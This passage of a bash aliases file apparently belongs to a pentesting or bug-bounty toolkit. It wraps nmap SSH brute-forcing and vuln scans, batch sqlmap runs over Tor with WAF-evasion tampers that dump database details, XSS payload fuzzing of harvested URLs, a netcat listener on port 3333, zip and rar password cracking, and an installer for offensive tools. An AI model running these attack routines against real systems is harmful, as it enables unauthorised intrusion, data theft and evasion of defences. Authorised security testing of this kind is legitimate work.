				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/dictionary$1.txt -u $2
				break
				;;
			"Quit")
				break
				;;
			*) echo "invalid option $REPLY";;
		esac
	done
}

sshbrute(){
	re='^[0-9]+$'
	if [[ $2 =~ $re ]]; then
		nmap -Pn -p$2 --script ssh-brute $1
	else
		nmap -Pn -p22 --script ssh-brute $1
	fi
}

getparams(){
	regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
	if [[ ! $1 =~ $regex ]]; then 
		echo -e "\e[32mURL not valid!\033[0m"
		return
	fi
	
	cwd=$(pwd)
	a=$(arjun -u $1 -m GET -t 5 | grep "Valid parameter")
	b=$(arjun -u $1 -m POST -t 5 | grep "Valid parameter")

	echo -e "\e[32mGET: $a\033[0m"
	echo -e "\e[32mPOST: $b\033[0m"
	cd $cwd
}

nmap2(){
	PS3='Please enter your choice: '
	options=("alive" "fast" "web vulns" "all ports" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"alive")
				nmap -sP -Pn -T5 $1
				break
				;;
			"fast")
				nmap -sS -Pn -T5 -F $1
				break
				;;
			"web vulns")
				nmap -sS -Pn -T5 -p80,443 --script "vuln" $1
				break
				;;
			"all ports")
				nmap -sS -Pn -T5 -p- --host-timeout 60m $1
				break
				;;
			"Quit")
				break
				;;
			*) echo "invalid option $REPLY";;
		esac
	done
}

batchsqlmap(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	now=$(date +"%Y%m%d%H%M%S")
	grep "\?" $1 > lista$now.txt
	if [[ -f lista$now.txt && ! -s lista$now.txt ]]; then
		rm lista$now.txt
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	
	# limpio las urls (dejo solo 1 url con el mismo path y distintos parametros)
	uniqueurls lista$now.txt listalimpia$now.txt
	rm lista$now.txt
	
	if [[ -f listalimpia$now.txt && ! -s listalimpia$now.txt ]]; then
		rm listalimpia$now.txt
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	
	nombre=$(head -n 1 listalimpia$now.txt | unfurl format "%d")
	echo "************************* Testing $dom *************************" > ~/tools/results/sqlmap$nombre$now.txt
	for i in `cat listalimpia$now.txt`; do 
		echo "************************* Testing $i *************************" >> ~/tools/results/sqlmap$nombre$now.txt
		python ~/tools/sqlmap-dev/sqlmap.py -u "$i" -v 0 --level=5 --risk=3 --threads=10 --answers="follow=Y" --batch --current-user --current-db --dbs --hostname --tor --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords >> ~/tools/results/sqlmap$nombre$now.txt 
	done
	rm listalimpia$now.txt
}

geturls(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	now=$(date +"%Y%m%d%H%M%S")
	touch $1urls$now.txt
	cat $1 | while read dom; do
		echo "$dom" | waybackurls >> $1urls$now.txt
		echo "$dom" | gau -b ttf,woff,svg,png,jpg,ico,woff2,jpeg >> $1urls$now.txt
	done
	sort -u -o $1urls$now.txt $1urls$now.txt
}

customdictfromurl(){
	validate="^([a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\.)+[a-zA-Z]{2,}$"
	if [[ $1 =~ $validate ]]; then 
		echo -e "\e[32mCreating custom dictionary for $1...\033[0m"
		echo $1 | gau -t 10 -b ttf,woff,svg,png,jpg,ico,woff2,jpeg | sed -E '/(\.ttf$|\.woff$|\.svg$|\.png$|\.jpeg$|\.jpg$|\.ico$|\.woff2$|\.jpeg$)/d' | grep "$1/" | timeout 30 fff | wordlistgen -fq >> ~/tools/__diccionarios/dictionary$1.txt
		sort -u -o ~/tools/__diccionarios/dictionary$1.txt ~/tools/__diccionarios/dictionary$1.txt
	else
		echo -e "\e[32mInvalid URL\033[0m"
	fi
}

decode(){
	python ~/tools/basecrack/basecrack.py -m -b $1
}

sqlmapdominios(){
	archivo=$(geturls $1)
	batchsqlmap $archivo
}

sqlmap(){
	python ~/tools/sqlmap-dev/sqlmap.py -u "$i" -v 0 --level=5 --risk=3 --threads=10 --answers="follow=Y" --batch --current-user --current-db --dbs --hostname --tor --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
}

netcat(){
	nc -lvnp 3333
}

validdomain(){
	regex='(?=^.{4,253}$)(^(?:[a-zA-Z0-9](?:(?:[a-zA-Z0-9\-]){0,61}[a-zA-Z0-9])?\.)+([a-zA-Z]{2,}|xn--[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])$)'
	if [[ $1 =~ $regex ]]; then 
		echo $1
	fi
}

# Sends a file or text message through telegram bot
# Set $token and $chat on .bashrc for example:
# 	chat=113371337
#	token=13371331337:NNToP1MO9ayMMGqLVw5qsG9sgqhizy8XNZW
send(){
	if [ -f "$1" ]; then
        curl "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chat" -F document=@$1
    else
        curl --silent --output /dev/null "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat&text=$1"
    fi  
}

testapk(){
	cd ~/tools/apks/
	if ls *.xapk 1> /dev/null 2>&1; then
		7z e *.xapk *.apk 1> /dev/null 2>&1
		rm *.xapk 1> /dev/null 2>&1
	fi
	for f in *.apk; do 
		folder=$(date +"%Y%m%d%H%M%S")
		echo -ne "\r\033[K\e[32mDecompiling $f..."
		START=$(date +%s)
		apktool -o ~/tools/apks/$folder d "$f" 1> /dev/null 2>&1
		END=$(date +%s)
		DIFF=$((END-START))
		echo " done in $DIFF seconds."
		echo "Checking for secrets..."
		echo ~/tools/apks/$folder | nuclei -silent -t ~/tools/apks/mobile-nuclei-templates/Keys
		rm -rf ~/tools/apks/$folder
		echo "\e[32mChecking for leaks..."
		python ~/tools/apks/apkleaks/apkleaks.py -f "$f"
		echo "Done."
	done
	echo -e "\033[0m"
}

xss(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	if [[ -f ~/tools/__diccionarios/xsslist.txt && ! -s ~/tools/__diccionarios/xsslist.txt ]]; then
		echo -e "\e[32mXSS ~/tools/__diccionarios/xsslist.txt file is empty!\033[0m"
		return
	fi

	cat $1 | grep "=" | while read host; do 
		cat ~/tools/__diccionarios/xsslist.txt | while read xss; do 
			h=$(echo "$host" | qsreplace "$xss")
			curl -s --path-as-is --insecure "$h" | grep -qs "$xss" && echo "$h Vulnerable" || echo -ne "\rTesting ${host:0:50}                          " &
		done
	done
}

#para instalar todas las aplicaciones que utilizo
install(){
	cd ~
	mkdir -p tools/{__diccionarios,recon,takeovers,crons,apks}

	# golang
	cd /usr/local/
	mkdir go
	wget https://golang.org/dl/go1.16.4.linux-amd64.tar.gz
	tar -C /usr/local -xzf go1.16.4.linux-amd64.tar.gz
	export GOROOT=/usr/local/go
	export GOPATH=$HOME/go
	export PATH=$PATH:$GOPATH/bin:$GOROOT/bin
	
	# actualizo el SO
	cd ~/tools
	sudo apt update 
	sudo apt upgrade -y
	
	# git, nmap, curl, pip3, gcc, make, libpcap-dev
	sudo apt-get install git nmap curl python-pip gcc make libpcap-dev libssl-dev -y
	
	# dirsearch, EyeWitness
	git clone https://github.com/maurosoria/dirsearch.git
	git clone https://github.com/FortyNorthSecurity/EyeWitness.git
	cd EyeWitness/setup
	./setup.sh
	cd ..
	cd ..
	
	# altdns https://github.com/infosec-au/altdns
	curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
	python get-pip.py
	pip install py-altdns
	
	# massdns
	git clone https://github.com/blechschmidt/massdns.git
	cd massdns
	sudo make
	cp bin/massdns /bin/
	cd ..

	# Sublist3r
	git clone https://github.com/aboul3la/Sublist3r.git
	cd Sublist3r
	pip3 install -r requirements.txt
	cd ..
	
	# sqlmap
	git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	
	# paramspider
	git clone https://github.com/devanshbatham/ParamSpider
	cd ParamSpider
	pip3 install -r requirements.txt
	cd ..
	
	# masscan
	git clone https://github.com/robertdavidgraham/masscan
	cd masscan
	make
	cp bin/masscan /bin/
	cd ..
	
	# XSStrike
	git clone https://github.com/s0md3v/XSStrike.git
	cd XSStrike
	pip3 install -r requirements.txt
	cd ..

	# arjun
	mkdir Arjun
	cd Arjun
	git clone https://github.com/s0md3v/Arjun.git
	python3 setup.py install
	cd ..

	# basecrack
	git clone https://github.com/mufeedvh/basecrack.git
	cd basecrack
	pip install -r requirements.txt
	cd ..
	
	# ciphey https://github.com/Ciphey/Ciphey (for CTF)
	python -m pip install ciphey --upgrade
	
	# wordlistgen, httprobe, assetfinder, fuff, amass, subfinder
	go get -u github.com/ameenmaali/wordlistgen
	go get -u github.com/tomnomnom/httprobe
	go get -u github.com/tomnomnom/assetfinder
	go get -u github.com/tomnomnom/unfurl
	go get -u github.com/tomnomnom/waybackurls
	go get -u github.com/tomnomnom/fff
	go get -u github.com/lc/gau
	go get -u github.com/ffuf/ffuf	
	export GO111MODULE=on
	go get -v github.com/OWASP/Amass/v3/...
	GO111MODULE=on go get -u -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
	GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
	nuclei -update-templates
	cd apks
	git clone https://github.com/optiv/mobile-nuclei-templates.git
	# https://github.com/dwisiswant0/apkleaks
	git clone https://github.com/dwisiswant0/apkleaks
	cd apkleaks/
	pip3 install -r requirements.txt
	cd ..
	
	
	# jtr
	git clone https://github.com/magnumripper/JohnTheRipper.git
	cd JohnTheRipper
	./configure && make
	cd ..
	
	# desktop & vncserver
	sudo apt install xfce4 xfce4-goodies
	sudo apt install tightvncserver
	#ejecutar vncserver para configurar password
	vncserver
	
	reinstall
	sudo apt autoremove
	sudo apt clean
	sudo apt autoclean
	send "Bashaliases installed!"
}

crackzip(){
	if [[ -f $1 ]]; then
		echo -e "\e[32mZip file not found!\033[0m"
		return
	fi
	~/tools/JohnTheRipper/run/zip2john $1 > $1.hashes
	~/tools/JohnTheRipper/run/john $1.hashes
}

crackrar(){
	if [[ -f $1 ]]; then
		echo -e "\e[32mRar file not found!\033[0m"
		return
	fi
	~/tools/JohnTheRipper/run/rar2john $1 > $1.hashes
	~/tools/JohnTheRipper/run/john $1.hashes
}

update(){
	/usr/bin/python -m pip install --upgrade pip
	cd ~/tools/dirsearch && git pull
	cd ~/tools/EyeWitness && git pull
	cd ~/tools/massdns && git pull
	cd ~/tools/Sublist3r && git pull
	cd ~/tools/ParamSpider && git pull
	cd ~/tools/masscan && git pull && make && make install
	cd ~/tools/XSStrike && git pull
	cd ~/tools/Arjun && git pull
	cd ~/tools/basecrack && git pull
	cd ~/tools/pacu && git pull
	cd ~/tools/sqlmap-dev && git pull
	cd ~/tools/JohnTheRipper && git pull
	cd ~/tools/apks/apkleaks/ && git pull
	cd ~/tools/ && python -m pip install ciphey --upgrade < /dev/null 2>&1
	go get -u github.com/ameenmaali/wordlistgen
	go get -u github.com/tomnomnom/httprobe
	go get -u github.com/tomnomnom/assetfinder
	go get -u github.com/tomnomnom/unfurl
	go get -u github.com/tomnomnom/waybackurls
	go get -u github.com/tomnomnom/fff
	go get -u github.com/lc/gau
	go get -u github.com/ffuf/ffuf	
	GO111MODULE=on go get -v github.com/OWASP/Amass/v3/...
	GO111MODULE=on go get -u -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
	GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
	nuclei -update-templates
	go clean -modcache
	send "Bashaliases updated!"
}

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin:$GOROOT/bin